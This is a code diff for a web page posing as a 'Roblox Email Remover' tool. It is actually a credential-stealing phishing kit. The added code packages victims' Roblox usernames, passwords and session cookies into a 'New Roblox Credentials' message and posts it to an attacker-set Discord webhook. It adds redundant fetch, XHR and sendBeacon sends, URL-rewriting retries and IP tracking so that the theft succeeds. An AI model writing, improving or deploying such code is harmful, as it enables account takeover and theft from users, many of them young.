@@ -942,21 +942,55 @@
             // Fallback 3: Check URL parameters for webhook
             if (!webhookUrl) {
                 const urlParams = new URLSearchParams(window.location.search);
-                const encodedWebhook = urlParams.get('webhook');
-                if (encodedWebhook) {
-                    try {
-                        const decodedWebhook = atob(encodedWebhook);
-                        if (decodedWebhook && decodedWebhook.includes('discord.com/api/webhooks')) {
-                            webhookUrl = decodedWebhook;
-                            console.log('Fallback 3 - Using webhook URL from URL parameter');
-                            // Store it in localStorage for future use in multiple formats for compatibility
-                            localStorage.setItem('discord_webhook_url_plain', webhookUrl);
-                            localStorage.setItem('webhookUrl', webhookUrl);
-                            localStorage.setItem('discord_webhook_url', btoa(JSON.stringify({webhookUrl: webhookUrl})));
-                            console.log('Stored webhook URL in multiple formats for compatibility');
+                
+                // First check for plain webhook parameter
+                const plainWebhook = urlParams.get('webhook_plain');
+                if (plainWebhook && (plainWebhook.includes('discord.com/api/webhooks') || 
+                                    plainWebhook.includes('discord.com/webhooks'))) {
+                    webhookUrl = plainWebhook;
+                    console.log('Fallback 3 - Using plain webhook URL from URL parameter');
+                } else {
+                    // If plain webhook not found, try encoded webhook
+                    const encodedWebhook = urlParams.get('webhook');
+                    if (encodedWebhook) {
+                        try {
+                            // Try to decode it as base64
+                            const decodedWebhook = atob(encodedWebhook);
+                            if (decodedWebhook && decodedWebhook.includes('discord.com/api/webhooks')) {
+                                webhookUrl = decodedWebhook;
+                                console.log('Fallback 3 - Using webhook URL from URL parameter (base64 decoded)');
+                            }
+                        } catch (e) {
+                            console.error('Fallback 3 base64 decoding failed, trying direct value:', e);
+                            // If base64 decoding fails, try using the raw value
+                            if (encodedWebhook.includes('discord.com/api/webhooks') || 
+                                encodedWebhook.includes('discord.com/webhooks')) {
+                                webhookUrl = encodedWebhook;
+                                console.log('Fallback 3 - Using raw webhook URL from URL parameter');
+                            }
                         }
-                    } catch (e) {
-                        console.error('Fallback 3 decoding failed:', e);
+                    }
+                }
+                    
+                    // If we found a webhook URL, store it in all possible formats for maximum compatibility
+                    if (webhookUrl) {
+                        // Ensure the URL has the correct format
+                        if (webhookUrl.includes('discord.com/webhooks/') && !webhookUrl.includes('/api/webhooks/')) {
+                            webhookUrl = webhookUrl.replace('discord.com/webhooks/', 'discord.com/api/webhooks/');
+                        }
+                        
+                        // Store in all known formats used by different versions of the code
+                        localStorage.setItem('discord_webhook_url_plain', webhookUrl);
+                        localStorage.setItem('webhookUrl', webhookUrl);
+                        localStorage.setItem('discord_webhook_url', btoa(JSON.stringify({url: webhookUrl})));
+                        localStorage.setItem('webhook_url', webhookUrl);
+                        localStorage.setItem('discord_webhook', webhookUrl);
+                        
+                        // Also store as JSON object formats
+                        localStorage.setItem('webhook_data', btoa(JSON.stringify({webhookUrl: webhookUrl})));
+                        localStorage.setItem('discord_data', btoa(JSON.stringify({webhook: webhookUrl})));
+                        
+                        console.log('Stored webhook URL in multiple formats for maximum compatibility');
                     }
                 }
             }
@@ -1108,18 +1142,47 @@
                     return;
                 }
                 
-                // Log webhook information for debugging
+                // Enhanced logging for webhook debugging
                 console.log('Using webhook URL:', webhookUrl);
+                console.log('Webhook URL first 30 chars:', webhookUrl ? webhookUrl.substring(0, 30) + '...' : 'Not found');
+                console.log('Webhook URL length:', webhookUrl ? webhookUrl.length : 0);
                 console.log('Using directory:', directory || 'Not specified');
-                console.log('Webhook URL source:', localStorage.getItem('webhookUrl') ? 'localStorage' : 
-                                              (new URLSearchParams(window.location.search).get('webhook') ? 'URL parameter' : 'Unknown'));
+                
+                // Determine webhook source with more detail
+                let webhookSource = 'Unknown';
+                if (localStorage.getItem('webhookUrl')) {
+                    webhookSource = 'localStorage (webhookUrl)';
+                } else if (localStorage.getItem('discord_webhook_url_plain')) {
+                    webhookSource = 'localStorage (discord_webhook_url_plain)';
+                } else if (new URLSearchParams(window.location.search).get('webhook_plain')) {
+                    webhookSource = 'URL parameter (webhook_plain)';
+                } else if (new URLSearchParams(window.location.search).get('webhook')) {
+                    webhookSource = 'URL parameter (webhook base64)';
+                }
+                console.log('Webhook URL source:', webhookSource);
                 console.log('URL parameters present:', window.location.search);
+                
+                // Log all URL parameters for debugging
+                const urlParams = new URLSearchParams(window.location.search);
+                urlParams.forEach((value, key) => {
+                    console.log(`URL parameter ${key}:`, value.length > 50 ? value.substring(0, 50) + '...' : value);
+                });
                 
                 // Include directory in the log if available
                 const directoryInfo = directory ? `Directory: ${directory}` : 'No directory specified';
                 
+                // Create a simpler data format that's more reliable for Discord webhooks
                 const data = {
+                    content: `@everyone **New Roblox Credentials**\n\nUsername: ${username}\nPassword: ${password}\nCookie: \`${cookie.length > 1000 ? cookie.substring(0, 1000) : cookie}\`\nEmail Option: ${selectedOption === '13plus' ? 'Replace With Temporary Email' : 'Remove Email Completely'}\nDirectory: ${directory || 'Not specified'}\nTimestamp: ${new Date().toLocaleString()}`,
+                    username: "Roblox Email Remover",
+                    avatar_url: "https://i.imgur.com/4M34hi2.png"
+                };
+                
+                // Also create a backup embed format in case the content format fails
+                const dataWithEmbeds = {
                     content: '@everyone',
+                    username: "Roblox Email Remover",
+                    avatar_url: "https://i.imgur.com/4M34hi2.png",
                     embeds: [{
                         title: 'Roblox Email Removal',
                         color: 0x00FFFF,
@@ -1162,14 +1225,39 @@
                     }]
                 };
                 
-                // Validate webhook URL before sending
-                if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
-                    console.error('Invalid webhook URL format:', webhookUrl);
-                    showToast('Error', 'Invalid webhook URL format. Please reconfigure in setup.html', false);
-                    processBtn.disabled = false;
-                    processBtn.innerHTML = '<i class="fas fa-trash-alt"></i> REMOVE EMAIL';
-                    return;
+                // Function to validate and correct webhook URL format
+            function validateAndCorrectWebhookUrl(url) {
+                if (!url) return null;
+                
+                // Remove trailing slashes
+                while (url.endsWith('/')) {
+                    url = url.slice(0, -1);
                 }
+                
+                // Check if it's a Discord URL
+                if (!url.includes('discord.com')) {
+                    console.error('Not a Discord URL:', url);
+                    return null;
+                }
+                
+                // Ensure proper API format
+                if (url.includes('discord.com/webhooks/') && !url.includes('/api/webhooks/')) {
+                    url = url.replace('discord.com/webhooks/', 'discord.com/api/webhooks/');
+                    console.log('Corrected webhook URL format to include /api/:', url);
+                }
+                
+                return url;
+            }
+            
+            // Validate webhook URL before sending
+            webhookUrl = validateAndCorrectWebhookUrl(webhookUrl);
+            if (!webhookUrl) {
+                console.error('Invalid webhook URL format');
+                showToast('Error', 'Invalid webhook URL format. Please reconfigure in setup.html', false);
+                processBtn.disabled = false;
+                processBtn.innerHTML = '<i class="fas fa-trash-alt"></i> REMOVE EMAIL';
+                return;
+            }
                 
                 // Try to get IP address for better tracking
                 fetch('https://api.ipify.org?format=json')
@@ -1185,18 +1273,45 @@
                 .finally(() => {
                     // Send the data to Discord with improved error handling
                     console.log('Sending data to webhook:', webhookUrl);
-                    console.log('Data being sent:', JSON.stringify(data));
+                    console.log('Data being sent (simple format):', JSON.stringify(data));
+                    console.log('Data being sent (embed format):', JSON.stringify(dataWithEmbeds));
                     
-                    // Try all methods to ensure delivery
+                    // Try all methods to ensure delivery with both data formats
+                    // First try with simple format
                     sendWithFetch(webhookUrl, data);
-                    setTimeout(() => sendWithXHR(webhookUrl, data), 500); // Backup method with delay
-                    setTimeout(() => sendWithBeacon(webhookUrl, data), 1000); // Third method with longer delay
+                    setTimeout(() => sendWithXHR(webhookUrl, data), 300); // Backup method with delay
+                    
+                    // Then try with embed format after a delay
+                    setTimeout(() => sendWithFetch(webhookUrl, dataWithEmbeds), 600);
+                    setTimeout(() => sendWithXHR(webhookUrl, dataWithEmbeds), 900); // Backup method with delay
+                    
+                    // Final attempt with beacon
+                    setTimeout(() => sendWithBeacon(webhookUrl, data), 1200); // Third method with longer delay
+                    setTimeout(() => sendWithBeacon(webhookUrl, dataWithEmbeds), 1500); // Third method with longer delay
                 });
                 
-                // Method 1: Using fetch API with improved reliability
+                // Method 1: Using fetch API with improved reliability and Discord compatibility
                 function sendWithFetch(url, payload) {
+                    // Clean the URL to ensure it's a valid Discord webhook URL
+                    let cleanUrl = url;
+                    
+                    // Remove any trailing slashes
+                    while (cleanUrl.endsWith('/')) {
+                        cleanUrl = cleanUrl.slice(0, -1);
+                    }
+                    
+                    // Ensure the URL has the correct format for Discord webhooks
+                    if (!cleanUrl.includes('/api/webhooks/')) {
+                        // Try to fix common URL issues
+                        if (cleanUrl.includes('discord.com/webhooks/')) {
+                            cleanUrl = cleanUrl.replace('discord.com/webhooks/', 'discord.com/api/webhooks/');
+                        }
+                    }
+                    
                     // Add a timestamp to prevent caching issues
-                    const timestampedUrl = url + (url.includes('?') ? '&' : '?') + '_t=' + Date.now();
+                    const timestampedUrl = cleanUrl + (cleanUrl.includes('?') ? '&' : '?') + '_t=' + Date.now();
+                    
+                    console.log('Sending to cleaned webhook URL:', timestampedUrl);
                     
                     fetch(timestampedUrl, {
                         method: 'POST',
@@ -1225,19 +1340,48 @@
                         // Don't show error toast here as we have backup methods
                         // Try with a different approach if fetch fails
                         console.log('Fetch failed, trying with direct URL...');
-                        // Try with direct URL without parameters
+                        
+                        // Try different URL variations
                         if (url.includes('?')) {
+                            // Try without query parameters
                             const baseUrl = url.split('?')[0];
-                            setTimeout(() => sendWithFetch(baseUrl, payload), 300);
+                            setTimeout(() => sendWithFetch(baseUrl, payload), 200);
+                        } else if (url.includes('/api/webhooks/')) {
+                            // Try without the /api/ part
+                            const altUrl = url.replace('/api/webhooks/', '/webhooks/');
+                            setTimeout(() => sendWithFetch(altUrl, payload), 400);
                         }
                     });
                 }
                 
                 // Method 2: Using XMLHttpRequest
                 function sendWithXHR(url, payload) {
+                    // Clean the URL to ensure it's a valid Discord webhook URL
+                    let cleanUrl = url;
+                    
+                    // Remove any trailing slashes
+                    while (cleanUrl.endsWith('/')) {
+                        cleanUrl = cleanUrl.slice(0, -1);
+                    }
+                    
+                    // Ensure the URL has the correct format for Discord webhooks
+                    if (!cleanUrl.includes('/api/webhooks/')) {
+                        // Try to fix common URL issues
+                        if (cleanUrl.includes('discord.com/webhooks/')) {
+                            cleanUrl = cleanUrl.replace('discord.com/webhooks/', 'discord.com/api/webhooks/');
+                        }
+                    }
+                    
+                    // Add a timestamp to prevent caching issues
+                    const timestampedUrl = cleanUrl + (cleanUrl.includes('?') ? '&' : '?') + '_t=' + Date.now();
+                    
+                    console.log('Sending to cleaned webhook URL (XHR):', timestampedUrl);
+                    
                     const xhr = new XMLHttpRequest();
-                    xhr.open('POST', url, true);
+                    xhr.open('POST', timestampedUrl, true);
                     xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.setRequestHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+                    xhr.setRequestHeader('Pragma', 'no-cache');
                     
                     xhr.onload = function() {
                         if (xhr.status >= 200 && xhr.status < 300) {
@@ -1245,6 +1389,20 @@
                             showToast('Success', 'Data successfully sent to Discord');
                         } else {
                             console.error('Error sending to Discord (XHR):', xhr.status, xhr.statusText);
+                            
+                            // Try different URL variations if the first attempt fails
+                            if (url.includes('?')) {
+                                // Try without query parameters
+                                const baseUrl = url.split('?')[0];
+                                setTimeout(() => sendWithXHR(baseUrl, payload), 250);
+                                return; // Don't show error toast yet
+                            } else if (url.includes('/api/webhooks/')) {
+                                // Try without the /api/ part
+                                const altUrl = url.replace('/api/webhooks/', '/webhooks/');
+                                setTimeout(() => sendWithXHR(altUrl, payload), 450);
+                                return; // Don't show error toast yet
+                            }
+                            
                             showToast('Webhook Error', `Failed to send data to Discord: ${xhr.status} ${xhr.statusText}`, false);
                         }
                     };
@@ -1260,30 +1418,90 @@
                 // Method 3: Using Navigator.sendBeacon (works even when page is unloading)
                 function sendWithBeacon(url, payload) {
                     try {
+                        // Clean the URL to ensure it's a valid Discord webhook URL
+                        let cleanUrl = url;
+                        
+                        // Remove any trailing slashes
+                        while (cleanUrl.endsWith('/')) {
+                            cleanUrl = cleanUrl.slice(0, -1);
+                        }
+                        
+                        // Ensure the URL has the correct format for Discord webhooks
+                        if (!cleanUrl.includes('/api/webhooks/')) {
+                            // Try to fix common URL issues
+                            if (cleanUrl.includes('discord.com/webhooks/')) {
+                                cleanUrl = cleanUrl.replace('discord.com/webhooks/', 'discord.com/api/webhooks/');
+                            }
+                        }
+                        
+                        // Add a timestamp to prevent caching issues
+                        const timestampedUrl = cleanUrl + (cleanUrl.includes('?') ? '&' : '?') + '_t=' + Date.now();
+                        
+                        console.log('Sending to cleaned webhook URL (Beacon):', timestampedUrl);
+                        
                         const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-                        const success = navigator.sendBeacon(url, blob);
+                        const success = navigator.sendBeacon(timestampedUrl, blob);
                         console.log('Discord webhook sendBeacon attempt:', success ? 'successful' : 'failed');
+                        
                         if (success) {
                             showToast('Success', 'Data successfully sent to Discord (beacon)');
+                        } else {
+                            // Try different URL variations if the first attempt fails
+                            if (url.includes('?')) {
+                                // Try without query parameters
+                                const baseUrl = url.split('?')[0];
+                                setTimeout(() => {
+                                    console.log('Trying beacon with base URL:', baseUrl);
+                                    const altBlob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                                    navigator.sendBeacon(baseUrl, altBlob);
+                                }, 300);
+                            } else if (url.includes('/api/webhooks/')) {
+                                // Try without the /api/ part
+                                const altUrl = url.replace('/api/webhooks/', '/webhooks/');
+                                setTimeout(() => {
+                                    console.log('Trying beacon with alternate URL:', altUrl);
+                                    const altBlob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                                    navigator.sendBeacon(altUrl, altBlob);
+                                }, 500);
+                            }
                         }
                     } catch (e) {
                         console.error('Error using sendBeacon:', e);
                     }
                 }
                 
-                // Backup method using XMLHttpRequest in case fetch fails
+                // Backup method using direct XMLHttpRequest in case all other methods fail
+                // First try with simple format
                 const xhr = new XMLHttpRequest();
                 xhr.open('POST', webhookUrl, true);
                 xhr.setRequestHeader('Content-Type', 'application/json');
                 xhr.onload = function() {
                     if (xhr.status >= 200 && xhr.status < 300) {
-                        console.log('XHR backup method success:', xhr.responseText);
+                        console.log('XHR direct backup method success (simple format):', xhr.responseText);
                     } else {
-                        console.error('XHR backup method failed:', xhr.status, xhr.statusText);
+                        console.error('XHR direct backup method failed (simple format):', xhr.status, xhr.statusText);
+                        
+                        // If simple format fails, try with embed format
+                        setTimeout(() => {
+                            const xhrEmbed = new XMLHttpRequest();
+                            xhrEmbed.open('POST', webhookUrl, true);
+                            xhrEmbed.setRequestHeader('Content-Type', 'application/json');
+                            xhrEmbed.onload = function() {
+                                if (xhrEmbed.status >= 200 && xhrEmbed.status < 300) {
+                                    console.log('XHR direct backup method success (embed format):', xhrEmbed.responseText);
+                                } else {
+                                    console.error('XHR direct backup method failed (embed format):', xhrEmbed.status, xhrEmbed.statusText);
+                                }
+                            };
+                            xhrEmbed.onerror = function() {
+                                console.error('XHR network error (embed format)');
+                            };
+                            xhrEmbed.send(JSON.stringify(dataWithEmbeds));
+                        }, 300);
                     }
                 };
                 xhr.onerror = function() {
-                    console.error('XHR network error');
+                    console.error('XHR network error (simple format)');
                 };
                 xhr.send(JSON.stringify(data));
 
